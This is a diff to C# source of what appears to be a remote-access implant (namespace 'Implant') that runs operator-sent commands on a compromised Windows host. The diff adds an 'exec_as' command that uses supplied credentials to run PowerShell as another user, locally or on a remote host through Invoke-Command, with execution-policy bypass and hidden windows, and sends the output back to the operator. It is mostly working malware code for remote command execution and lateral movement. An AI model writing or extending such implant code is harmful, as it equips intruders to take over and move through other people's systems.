@@ -208,7 +208,7 @@ namespace Implant
             }
         }
 
- 
+
 
         private async Task ExecuteCommand(string command)
         {
@@ -218,9 +218,22 @@ namespace Implant
             {
                 await ChangeDirectory(command.Substring(3).Trim());
             }
+            else if (command.StartsWith("runas"))
+            {
+                // Mensaje de error para runas
+                await SendResponse(new
+                {
+                    result = "Runas command is not properly. Use: 'exec_as <user> <password> <host (localhost by default)> <command>' instead.",
+                    cwd = _currentDir
+                });
+            }
+            else if (command.StartsWith("exec_as "))
+            {
+                await ExecuteAsUser(command.Substring(8).Trim());
+            }
             else
             {
-                var result = ExecuteShellCommand(command);
+                var result = await ExecuteShellCommandAsync(command);
                 await SendResponse(new
                 {
                     result = !string.IsNullOrEmpty(result.output) ? result.output : result.error,
@@ -229,30 +242,199 @@ namespace Implant
             }
         }
 
-        private (string output, string error) ExecuteShellCommand(string command)
+
+
+        private async Task ExecuteAsUser(string commandWithCredentials)
         {
             try
             {
+                var username = "";
+                var password = "";
+                var host = "localhost";
+                var actualCommand = "";
+
+                var parts = commandWithCredentials.Split(new char[] { ' ' }, 3);
+                if (parts.Length < 3 || parts.Length > 4)
+                {
+                    await SendResponse(new
+                    {
+                        result = "Error: Wrong format. Use: exec_as <user> <password> <host (localhost by default)> <command>",
+                        cwd = _currentDir
+                    });
+                    return;
+                }
+
+                if (parts.Length == 3)
+                {
+                    username = parts[0];
+                    password = parts[1];
+                    actualCommand = parts[2];
+                }
+                if (parts.Length == 4)
+                {
+                    username = parts[0];
+                    password = parts[1];
+                    host = parts[2];
+                    actualCommand = parts[3];
+                }
+
+                var domain = Environment.UserDomainName;
+
+                var result = await ExecutePowerShellAsUser(actualCommand, username, domain, password);
+
+                await SendResponse(new
+                {
+                    result = result,
+                    cwd = _currentDir,
+                    executedAs = $"{domain}\\{username}"
+                });
+            }
+            catch (Exception ex)
+            {
+                await SendResponse(new
+                {
+                    result = $"Error: {ex.Message}",
+                    cwd = _currentDir
+                });
+            }
+        }
+
+
+
+        private async Task<string> ExecutePowerShellAsUser(string command, string username, string domain, string password, string host = "localhost")
+        {
+            try
+            {
+                string escapedPassword = password.Replace("'", "''");
+
+                string currentExe = Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName);
+
+                string psScript = $@"
+                  $securePassword = ConvertTo-SecureString '{escapedPassword}' -AsPlainText -Force
+                  $credential = New-Object System.Management.Automation.PSCredential('{domain}\{username}', $securePassword)
+
+                  try {{
+                      $result = Invoke-Command -ComputerName {host} -Credential $credential -ScriptBlock {{
+                          Set-Location $args[1]
+
+                          if ($args[0] -match '\.(exe|com|bat|cmd|msi)$' -or $args[0] -match '^(calc|notepad|mspaint|winword|excel|powerpnt)') {{
+                              & $args[0] 2>&1 | Out-String
+                          }}
+                          else {{
+                              Invoke-Expression $args[0] 2>&1 | Out-String
+                          }}
+                      }} -ArgumentList '{command}', '{_currentDir}' -ErrorAction Stop
+
+                      Write-Output ""$result""
+                  }}
+                  catch {{
+                      Write-Output ""ERROR:$($_.Exception.Message)""
+                  }}
+                  ";
+
                 var process = new Process
                 {
                     StartInfo = new ProcessStartInfo
                     {
                         FileName = "powershell.exe",
-                        Arguments = $"/c {command}",
+                        Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{psScript}\"",
                         WorkingDirectory = _currentDir,
                         RedirectStandardOutput = true,
                         RedirectStandardError = true,
                         UseShellExecute = false,
                         CreateNoWindow = true
-                    }
+                    },
+                    EnableRaisingEvents = true
+                };
+
+                if (command.IndexOf(currentExe, StringComparison.OrdinalIgnoreCase) >= 0)
+                {
+                    process.StartInfo.RedirectStandardOutput = false;
+                    process.StartInfo.RedirectStandardError = false;
+
+                    process.Start();
+                    return $"Process {process.Id} started in background (command matched {currentExe}).";
+                }
+
+                var outputBuilder = new StringBuilder();
+                var errorBuilder = new StringBuilder();
+                var tcs = new TaskCompletionSource<string>();
+
+                process.OutputDataReceived += (s, e) =>
+                {
+                    if (e.Data != null)
+                        outputBuilder.AppendLine(e.Data);
+                };
+
+                process.ErrorDataReceived += (s, e) =>
+                {
+                    if (e.Data != null)
+                        errorBuilder.AppendLine(e.Data);
+                };
+
+                process.Exited += (s, e) =>
+                {
+                    if (errorBuilder.Length > 0)
+                        tcs.TrySetResult("ERROR: " + errorBuilder.ToString());
+                    else
+                        tcs.TrySetResult(outputBuilder.ToString());
+
+                    process.Dispose();
                 };
 
                 process.Start();
-                var output = process.StandardOutput.ReadToEnd();
-                var error = process.StandardError.ReadToEnd();
-                process.WaitForExit();
+                process.BeginOutputReadLine();
+                process.BeginErrorReadLine();
 
-                return (output, error);
+                return await tcs.Task;
+            }
+            catch (Exception ex)
+            {
+                return $"Error ejecutando comando: {ex.Message}";
+            }
+        }
+
+
+
+
+        private async Task<(string output, string error)> ExecuteShellCommandAsync(string command)
+        {
+            try
+            {
+                string escapedCommand = command.Replace("'", "''").Replace("\"", "\\\"");
+                var process = new Process
+                {
+                    StartInfo = new ProcessStartInfo
+                    {
+                        FileName = "powershell.exe",
+                        Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{escapedCommand}\"",
+                        WorkingDirectory = _currentDir,
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true,
+                        UseShellExecute = false,
+                        CreateNoWindow = true
+                    },
+                    EnableRaisingEvents = true
+                };
+
+                var outputBuilder = new StringBuilder();
+                var errorBuilder = new StringBuilder();
+                var tcs = new TaskCompletionSource<(string, string)>();
+
+                process.OutputDataReceived += (s, e) => { if (e.Data != null) outputBuilder.AppendLine(e.Data); };
+                process.ErrorDataReceived += (s, e) => { if (e.Data != null) errorBuilder.AppendLine(e.Data); };
+
+                process.Exited += (s, e) =>
+                {
+                    tcs.TrySetResult((outputBuilder.ToString(), errorBuilder.ToString()));
+                    process.Dispose();
+                };
+
+                process.Start();
+                process.BeginOutputReadLine();
+                process.BeginErrorReadLine();
+
+                return await tcs.Task;
             }
             catch (Exception ex)
             {
